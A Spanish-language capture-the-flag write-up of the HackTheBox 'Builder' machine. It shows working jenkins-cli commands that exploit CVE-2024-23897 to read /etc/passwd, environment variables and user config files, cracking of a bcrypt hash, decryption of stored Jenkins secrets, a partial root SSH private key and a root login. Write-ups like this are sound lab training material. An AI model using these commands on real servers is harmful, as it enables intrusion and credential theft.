---
layout: single
title: Builder HTB - WriteUp
excerpt: WriteUp de la máquina Builder de HTB.
date: 2024-04-23
classes: wide
header:
  teaser: /assets/images/Builder/Builder.png
  teaser_home_page: true
  icon: /assets/images/Builder/Builder.png
categories:
  - infosec
tags:
  - ctf
  - Linux
  - Jenkins
  - CVE
  - Web
---


En el día de hoy estaremos resolviendo la máquina Builder de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.10. La explotación de esta máquina se basa vulnerar un Jenkins

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Explotación del CVE-2024-23897](#explotación-del-cve-2024-23897)
3. [Enumeración Jenkins](#enumeración-jenkins)
4. [Privesc](#privesc)


### Enumeración Inicial

Escaneo de puertos:

```bash
# Nmap 7.91 scan initiated Tue Apr 23 17:56:49 2024 as: nmap -sCV -oN Extraction -p22,8080 10.10.11.10
Nmap scan report for 10.10.11.10
Host is up (0.061s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 23 17:56:59 2024 -- 1 IP address (1 host up) scanned in 10.48 seconds

```

Al acceder al puerto 8080 podremos ver un Jenkins con la versión 2.441. 

### Explotación del CVE-2024-23897

Si hacemos una búsqueda en google podemos ver como existe un CVE bastante reciente que permite leer ficheros del sistema de forma parcial


> https://www.trendmicro.com/en_us/research/24/c/cve-2024-23897.html

Si nos leemos ese post vemos como realizar la explotación. Para ello necesitamos ``jenkinks-cl.jar``  La herramienta mencionada permite llamar diferentes funciones de Jenkins apuntando a la url. Para obtener la herramienta podemos hacer los siguiente:

```bash
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
```

Una vez tengamos la herramienta podemos empezar con la explotación.

```bash
❯ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' connect-node '@/etc/passwd' 2>&1
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.
```

En el jenkins podemos ver que hay unas credenciales almacenadas.
![](/assets/images/Builder/pic1.png)



### Enumeración Jenkins

Vamos a leer las variables de entorno para sacar algo de información:
```bash
❯ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' connect-node '@/proc/self/environ' 2>&1

ERROR: No such agent "HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" exists.
```

Podemos observar que el home es "/var/jenkins_home/" dentro del home de Jenkins hay muchos datos interesantes que podríamos intentar leer

Resumen del directorio
> https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa

```
|-- config.xml
|-- jenkins.install.InstallUtil.lastExecVersion
|-- org.jenkinsci.main.modules.sshd.SSHD.xml
`-- users
|   |-- user_xxxxxxxxxxxxxxxxxxx
|   |   `-- config.xml
    `-- users.xml
```

Vamos a leer el archivo users.xml

```bash
❯ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' connect-node '@/var/jenkins_home/users/users.xml'
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such agent "  <idToDirectoryNameMap class="concurrent-hash-map">" exists.
    <entry>: No such agent "    <entry>" exists.
      <string>jennifer</string>: No such agent "      <string>jennifer</string>" exists.
  <version>1</version>: No such agent "  <version>1</version>" exists.
</hudson.model.UserIdMapper>: No such agent "</hudson.model.UserIdMapper>" exists.
  </idToDirectoryNameMap>: No such agent "  </idToDirectoryNameMap>" exists.
<hudson.model.UserIdMapper>: No such agent "<hudson.model.UserIdMapper>" exists.
    </entry>: No such agent "    </entry>" exists.
```

Nos revela información sobre un usuario, vamos a leer su config.xml

```bash
❯ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' connect-node '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'

    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">: No such agent "    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">" exists.
    <hudson.search.UserSearchProperty>: No such agent "    <hudson.search.UserSearchProperty>" exists.
      <roles>: No such agent "      <roles>" exists.
    <jenkins.security.seed.UserSeedProperty>: No such agent "    <jenkins.security.seed.UserSeedProperty>" exists.
      </tokenStore>: No such agent "      </tokenStore>" exists.
    </hudson.search.UserSearchProperty>: No such agent "    </hudson.search.UserSearchProperty>" exists.
      <timeZoneName></timeZoneName>: No such agent "      <timeZoneName></timeZoneName>" exists.
  <properties>: No such agent "  <properties>" exists.
    <jenkins.security.LastGrantedAuthoritiesProperty>: No such agent "    <jenkins.security.LastGrantedAuthoritiesProperty>" exists.
      <flags/>: No such agent "      <flags/>" exists.
    <hudson.model.MyViewsProperty>: No such agent "    <hudson.model.MyViewsProperty>" exists.
</user>: No such agent "</user>" exists.
    </jenkins.security.ApiTokenProperty>: No such agent "    </jenkins.security.ApiTokenProperty>" exists.
      <views>: No such agent "      <views>" exists.
        <string>authenticated</string>: No such agent "        <string>authenticated</string>" exists.
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">: No such agent "    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">" exists.
<user>: No such agent "<user>" exists.
          <name>all</name>: No such agent "          <name>all</name>" exists.
  <description></description>: No such agent "  <description></description>" exists.
      <emailAddress>jennifer@builder.htb</emailAddress>: No such agent "      <emailAddress>jennifer@builder.htb</emailAddress>" exists.
      <collapsed/>: No such agent "      <collapsed/>" exists.
    </jenkins.security.seed.UserSeedProperty>: No such agent "    </jenkins.security.seed.UserSeedProperty>" exists.
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>: No such agent "    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>" exists.
    </hudson.model.MyViewsProperty>: No such agent "    </hudson.model.MyViewsProperty>" exists.
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>: No such agent "      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>" exists.
          <filterQueue>false</filterQueue>: No such agent "          <filterQueue>false</filterQueue>" exists.
    <jenkins.security.ApiTokenProperty>: No such agent "    <jenkins.security.ApiTokenProperty>" exists.
      <primaryViewName></primaryViewName>: No such agent "      <primaryViewName></primaryViewName>" exists.
      </views>: No such agent "      </views>" exists.
    </hudson.model.TimeZoneProperty>: No such agent "    </hudson.model.TimeZoneProperty>" exists.
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">: No such agent "    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">" exists.
    </hudson.model.PaneStatusProperties>: No such agent "    </hudson.model.PaneStatusProperties>" exists.
    </hudson.tasks.Mailer_-UserProperty>: No such agent "    </hudson.tasks.Mailer_-UserProperty>" exists.
        <tokenList/>: No such agent "        <tokenList/>" exists.
    <jenkins.console.ConsoleUrlProviderUserProperty/>: No such agent "    <jenkins.console.ConsoleUrlProviderUserProperty/>" exists.
        </hudson.model.AllView>: No such agent "        </hudson.model.AllView>" exists.
      <timestamp>1707318554385</timestamp>: No such agent "      <timestamp>1707318554385</timestamp>" exists.
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>: No such agent "          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>" exists.
  </properties>: No such agent "  </properties>" exists.
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such agent "    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>" exists.
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>: No such agent "    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>" exists.
    <hudson.security.HudsonPrivateSecurityRealm_-Details>: No such agent "    <hudson.security.HudsonPrivateSecurityRealm_-Details>" exists.
      <insensitiveSearch>true</insensitiveSearch>: No such agent "      <insensitiveSearch>true</insensitiveSearch>" exists.
          <properties class="hudson.model.View$PropertyList"/>: No such agent "          <properties class="hudson.model.View$PropertyList"/>" exists.
    <hudson.model.TimeZoneProperty>: No such agent "    <hudson.model.TimeZoneProperty>" exists.
        <hudson.model.AllView>: No such agent "        <hudson.model.AllView>" exists.
    </hudson.security.HudsonPrivateSecurityRealm_-Details>: No such agent "    </hudson.security.HudsonPrivateSecurityRealm_-Details>" exists.
      <providerId>default</providerId>: No such agent "      <providerId>default</providerId>" exists.
      </roles>: No such agent "      </roles>" exists.
    </jenkins.security.LastGrantedAuthoritiesProperty>: No such agent "    </jenkins.security.LastGrantedAuthoritiesProperty>" exists.
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such agent "    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>" exists.
    <hudson.model.PaneStatusProperties>: No such agent "    <hudson.model.PaneStatusProperties>" exists.
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
  <fullName>jennifer</fullName>: No such agent "  <fullName>jennifer</fullName>" exists.
      <seed>6841d11dc1de101d</seed>: No such agent "      <seed>6841d11dc1de101d</seed>" exists.
  <id>jennifer</id>: No such agent "  <id>jennifer</id>" exists.
  <version>10</version>: No such agent "  <version>10</version>" exists.
      <tokenStore>: No such agent "      <tokenStore>" exists.
          <filterExecutors>false</filterExecutors>: No such agent "          <filterExecutors>false</filterExecutors>" exists.
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such agent "    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>" exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
```

Podemos ver un hash y crackear la contraseña:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash  ---> prinXXXXX
```

### Privesc


Con esta password podemos iniciar sesión en la aplicación:
![](/assets/images/Builder/pic2.png)

Este post nos eneseña a dumpear las crendenciales que almacena jenkins.

>https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials

Si administramos el secreto y hacemos la misma tecnica podemos obtener el secreto de encriptado

```
{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo4qcqH61hjEUdZtkPiX6buY1J4YKYFziwyFA1wH/X5XHjUb8lUYkf/XSuDhR5tIpVWwkk7l1FTYwQQl/i5MOTww3b1QNzIAIv41KLKDgsq4WUAS5RBt4OZ7v410VZgdVDDciihmdDmqdsiGUOFubePU9a4tQoED2uUHAWbPlduIXaAfDs77evLh98/INI8o/A+rlX6ehT0K40cD3NBEF/4Adl6BOQ/NSWquI5xTmmEBi3NqpWWttJl1q9soOzFV0C4mhQiGIYr8TPDbpdRfsgjGNKTzIpjPPmRr+j5ym5noOP/LVw09+AoEYvzrVKlN7MWYOoUSqD+C9iXGxTgxSLWdIeCALzz9GHuN7a1tYIClFHT1WQpa42EqfqcoB12dkP74EQ8JL4RrxgjgEVeD4stcmtUOFqXU/gezb/oh0Rko9tumajwLpQrLxbAycC6xgOuk/leKf1gkDOEmraO7uiy2QBIihQbMKt5Ls+l+FLlqlcY4lPD+3Qwki5UfNHxQckFVWJQA0zfGvkRpyew2K6OSoLjpnSrwUWCx/hMGtvvoHApudWsGz4esi3kfkJ+I/j4MbLCakYjfDRLVtrHXgzWkZG/Ao+7qFdcQbimVgROrncCwy1dwU5wtUEeyTlFRbjxXtIwrYIx94+0thX8n74WI1HO/3rix6a4FcUROyjRE9m//dGnigKtdFdIjqkGkK0PNCFpcgw9KcafUyLe4lXksAjf/MU4v1yqbhX0Fl4Q3u2IWTKl+xv2FUUmXxOEzAQ2KtXvcyQLA9BXmqC0VWKNpqw1GAfQWKPen8g/zYT7TFA9kpYlAzjsf6Lrk4Cflaa9xR7l4pSgvBJYOeuQ8x2Xfh+AitJ6AMO7K8o36iwQVZ8+p/I7IGPDQHHMZvobRBZ92QGPcq0BDqUpPQqmRMZc3wN63vCMxzABeqqg9QO2J6jqlKUgpuzHD27L9REOfYbsi/uM3ELI7NdO90DmrBNp2y0AmOBxOc9e9OrOoc+Tx2K0JlEPIJSCBBOm0kMr5H4EXQsu9CvTSb/Gd3xmrk+rCFJx3UJ6yzjcmAHBNIolWvSxSi7wZrQl4OWuxagsG10YbxHzjqgoKTaOVSv0mtiiltO/NSOrucozJFUCp7p8v73ywR6tTuR6kmyTGjhKqAKoybMWq4geDOM/6nMTJP1Z9mA+778Wgc7EYpwJQlmKnrk0bfO8rEdhrrJoJ7a4No2FDridFt68HNqAATBnoZrlCzELhvCicvLgNur+ZhjEqDnsIW94bL5hRWANdV4YzBtFxCW29LJ6/LtTSw9LE2to3i1sexiLP8y9FxamoWPWRDxgn9lv9ktcoMhmA72icQAFfWNSpieB8Y7TQOYBhcxpS2M3mRJtzUbe4Wx+MjrJLbZSsf/Z1bxETbd4dh4ub7QWNcVxLZWPvTGix+JClnn/oiMeFHOFazmYLjJG6pTUstU6PJXu3t4Yktg8Z6tk8ev9QVoPNq/XmZY2h5MgCoc/T0D6iRR2X249+9lTU5Ppm8BvnNHAQ31Pzx178G3IO+ziC2DfTcT++SAUS/VR9T3TnBeMQFsv9GKlYjvgKTd6Rx+oX+D2sN1WKWHLp85g6DsufByTC3o/OZGSnjUmDpMAs6wg0Z3bYcxzrTcj9pnR3jcywwPCGkjpS03ZmEDtuU0XUthrs7EZzqCxELqf9aQWbpUswN8nVLPzqAGbBMQQJHPmS4FSjHXvgFHNtWjeg0yRgf7cVaD0aQXDzTZeWm3dcLomYJe2xfrKNLkbA/t3le35+bHOSe/p7PrbvOv/jlxBenvQY+2GGoCHs7SWOoaYjGNd7QXUomZxK6l7vmwGoJi+R/D+ujAB1/5JcrH8fI0mP8Z+ZoJrziMF2bhpR1vcOSiDq0+Bpk7yb8AIikCDOW5XlXqnX7C+I6mNOnyGtuanEhiJSFVqQ3R+MrGbMwRzzQmtfQ5G34m67Gvzl1IQMHyQvwFeFtx4GHRlmlQGBXEGLz6H1Vi5jPuM2AVNMCNCak45l/9PltdJrz+Uq/d+LXcnYfKagEN39ekTPpkQrCV+P0S65y4l1VFE1mX45CR4QvxalZA4qjJqTnZP4s/YD1Ix+XfcJDpKpksvCnN5/ubVJzBKLEHSOoKwiyNHEwdkD9j8Dg9y88G8xrc7jr+ZcZtHSJRlK1o+VaeNOSeQut3iZjmpy0Ko1ZiC8gFsVJg8nWLCat10cp+xTy+fJ1VyIMHxUWrZu+duVApFYpl6ji8A4bUxkroMMgyPdQU8rjJwhMGEP7TcWQ4Uw2s6xoQ7nRGOUuLH4QflOqzC6ref7n33gsz18XASxjBg6eUIw9Z9s5lZyDH1SZO4jI25B+GgZjbe7UYoAX13MnVMstYKOxKnaig2Rnbl9NsGgnVuTDlAgSO2pclPnxj1gCBS+bsxewgm6cNR18/ZT4ZT+YT1+uk5Q3O4tBF6z/M67mRdQqQqWRfgA5x0AEJvAEb2dftvR98ho8cRMVw/0S3T60reiB/OoYrt/IhWOcvIoo4M92eo5CduZnajt4onOCTC13kMqTwdqC36cDxuX5aDD0Ee92ODaaLxTfZ1Id4ukCrscaoOZtCMxncK9uv06kWpYZPMUasVQLEdDW+DixC2EnXT56IELG5xj3/1nqnieMhavTt5yipvfNJfbFMqjHjHBlDY/MCkU89l6p/xk6JMH+9SWaFlTkjwshZDA/oO/E9Pump5GkqMIw3V/7O1fRO/dR/Rq3RdCtmdb3bWQKIxdYSBlXgBLnVC7O90Tf12P0+DMQ1UrT7PcGF22dqAe6VfTH8wFqmDqidhEdKiZYIFfOhe9+u3O0XPZldMzaSLjj8ZZy5hGCPaRS613b7MZ8JjqaFGWZUzurecXUiXiUg0M9/1WyECyRq6FcfZtza+q5t94IPnyPTqmUYTmZ9wZgmhoxUjWm2AenjkkRDzIEhzyXRiX4/vD0QTWfYFryunYPSrGzIp3FhIOcxqmlJQ2SgsgTStzFZz47Yj/ZV61DMdr95eCo+bkfdijnBa5SsGRUdjafeU5hqZM1vTxRLU1G7Rr/yxmmA5mAHGeIXHTWRHYSWn9gonoSBFAAXvj0bZjTeNBAmU8eh6RI6pdapVLeQ0tEiwOu4vB/7mgxJrVfFWbN6w8AMrJBdrFzjENnvcq0qmmNugMAIict6hK48438fb+BX+E3y8YUN+LnbLsoxTRVFH/NFpuaw+iZvUPm0hDfdxD9JIL6FFpaodsmlksTPz366bcOcNONXSxuD0fJ5+WVvReTFdi+agF+sF2jkOhGTjc7pGAg2zl10O84PzXW1TkN2yD9YHgo9xYa8E2k6pYSpVxxYlRogfz9exupYVievBPkQnKo1Qoi15+eunzHKrxm3WQssFMcYCdYHlJtWCbgrKChsFys4oUE7iW0YQ0MsAdcg/hWuBX878aR+/3HsHaB1OTIcTxtaaMR8IMMaKSM=}
```

Podemos desencriptarlo en http://10.10.11.10:8080/script con la funcion ``println hudson.util.Secret.decrypt("")``

Finalmente obtenemos la clave privada.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt3G9oUyouXj/0CLya9Wz7Vs31bC4rdvgv7n9PCwrApm8PmGCSLgv
Up2m70MKGF5e+s1KZZw7gQbVHRI0U+2t/u8A5dJJsU9DVf9w54N08IjvPK/cgFEYcyRXWA
EYz0+41fcDjGyzO9dlNlJ/w2NRP2xFg4+vYxX+tpq6G5Fnhhd5mCwUyAu7VKw4cVS36CNx
vqAC/KwFA8y0/s24T1U/sTj2xTaO3wlIrdQGPhfY0wsuYIVV3gHGPyY8bZ2HDdES5vDRpo
Fzwi85aNunCzvSQrnzpdrelqgFJc3UPV8s4yaL9JO3+s+akLr5YvPhIWMAmTbfeT3BwgMD
vUzyyF8wzh9Ee1J/6WyZbJzlP/Cdux9ilD88piwR2PulQXfPj6omT059uHGB4Lbp0AxRXo
L0gkxGXkcXYgVYgQlTNZsK8DhuAr0zaALkFo2vDPcCC1sc+FYTO1g2SOP4shZEkxMR1To5
yj/fRqtKvoMxdEokIVeQesj1YGvQqGCXNIchhfRNAAAFiNdpesPXaXrDAAAAB3NzaC1yc2
EAAAGBALdxvaFMqLl4/9Ai8mvVs+1bN9WwuK3b4L+5/TwsKwKZvD5hgki4L1Kdpu9DChhe
XvrNSmWcO4EG1R0SNFPtrf7vAOXSSbFPQ1X/cOeDdPCI7zyv3IBRGHMkV1gBGM9PuNX3A4
xsszvXZTZSf8NjUT9sRYOPr2MV/raauhuRZ4YXeZgsFMgLu1SsOHFUt+gjcb6gAvysBQPM...
```


Si probamos a iniciar sesión como root veremos que podemos sin problema y habremos ganado acceso a la máquina.

```
❯ ssh -i id_rsa root@10.10.11.10
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Apr 23 06:09:57 PM UTC 2024

  System load:              0.04296875
  Usage of /:               66.2% of 5.81GB
  Memory usage:             39%
  Swap usage:               0%
  Processes:                214
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.10
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:b3c1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr 23 16:28:54 2024 from 10.10.16.9
root@builder:~# 
```

Con esto habremos pwneado la máquina, espero que te haya servido!